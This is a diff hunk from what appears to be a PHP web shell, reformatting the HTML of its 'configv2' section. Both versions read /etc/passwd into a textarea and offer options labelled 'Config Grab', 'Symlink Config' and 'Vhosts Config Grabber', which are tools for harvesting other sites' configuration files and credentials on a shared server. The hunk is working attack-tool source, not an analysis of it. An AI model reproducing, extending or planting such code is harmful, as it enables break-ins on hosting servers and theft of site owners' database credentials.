@@ -2486,15 +2486,28 @@ elseif ($_GET['do'] == 'configv2') {
             }
         }
     } else {
-        echo "<form method=\"post\" action=\"\"><center>";
-        echo "</center></select><br><textarea name=\"passwd\" class='area' rows='15' cols='60'>\n";
-        echo include("/etc/passwd");
-        echo "</textarea><br><br>";
-        echo "<select class=\"select\" name=\"config\"  style=\"width: 450px;\" height=\"10\">";
-        echo "<option value=\"grab\">Config Grab</option>";
-        echo "<option value=\"symlink\">Symlink Config</option>";
-        echo "<option value=\"404\">Config 404</option>";
-        echo "<option value=\"symvhosts\">Vhosts Config Grabber</option><br><br><input type=\"submit\" value=\"Start!!\"></td></tr></center>\n";
+echo "<form method=\"post\" action=\"\">";
+echo "<center>";
+echo "<textarea name=\"passwd\" class=\"area\" rows=\"15\" cols=\"60\">";
+echo include("/etc/passwd");
+echo "</textarea>";
+echo "  
+  
+";
+
+echo "<select class=\"select\" name=\"config\" style=\"width: 450px;\">";
+echo "<option value=\"grab\">Config Grab</option>";
+echo "<option value=\"symlink\">Symlink Config</option>";
+echo "<option value=\"404\">Config 404</option>";
+echo "<option value=\"symvhosts\">Vhosts Config Grabber</option>";
+echo "</select>";
+
+echo "  
+  
+";
+echo "<input type=\"submit\" value=\"Start!\">";
+echo "</center>";
+echo "</form>";
     }
 }
 elseif ($_GET['do'] == 'drupalex') {
